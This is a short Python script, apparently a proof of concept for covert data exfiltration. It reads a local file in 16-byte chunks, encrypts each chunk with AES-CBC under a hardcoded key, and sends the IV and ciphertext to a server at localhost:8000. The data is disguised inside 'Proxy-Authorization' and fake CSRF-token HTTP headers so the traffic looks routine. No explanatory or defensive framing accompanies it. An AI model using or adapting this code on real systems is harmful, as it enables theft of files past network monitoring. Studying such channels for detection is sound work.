import base64

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

URL = 'http://{}:{}/'.format("localhost", 8000)
CHUNK_LENGTH = 16
SECRET_KEY = "a cheeky nando's"

if __name__ == "__main__":
    cipher = AES.new(bytes(SECRET_KEY, 'utf-8'), AES.MODE_CBC)

    with open(r'test.txt', 'rb') as f:
        data = f.read(CHUNK_LENGTH)

        while data != b'':
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            iv = base64.b64encode(cipher.iv).decode('utf-8')
            headers = {
                'Proxy-Authorization': 'basic {}'.format(iv),
                'X-CRSF-TOKEN': base64.b64encode(ct_bytes)
            }
            requests.get(URL, headers=headers)

            data = f.read(CHUNK_LENGTH)

        try:
            requests.get("localhost:8000/", )
        except requests.exceptions.InvalidSchema:
            pass
